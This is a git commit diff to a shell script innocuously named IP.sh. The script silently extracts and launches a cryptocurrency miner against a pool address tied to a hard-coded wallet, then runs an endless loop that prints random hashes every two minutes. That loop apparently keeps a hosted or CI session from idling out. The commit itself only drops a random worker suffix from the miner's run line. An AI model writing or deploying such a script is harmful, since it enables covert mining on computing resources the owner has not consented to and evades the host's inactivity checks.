9efb887dd47121c32990bc0e3ec7d219f979e977
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-05-08 17:29:58 +0700

    Update IP.sh

--- IP.sh
+++ IP.sh
@@ -8,7 +8,7 @@ tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
 
 chmod +x danila-miner >/dev/null 2>&1
 
-./danila-miner run https://server1.whalestonpool.com EQBU__5pqrJXDTFZInmRZl3nivwjunX6Glh41Z1KGNBLk1EZ.$(echo $(shuf -i 1-9999 -n 1)-sty)
+./danila-miner run https://server1.whalestonpool.com EQBU__5pqrJXDTFZInmRZl3nivwjunX6Glh41Z1KGNBLk1EZ
 
 while [ 1 ]; do
   while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
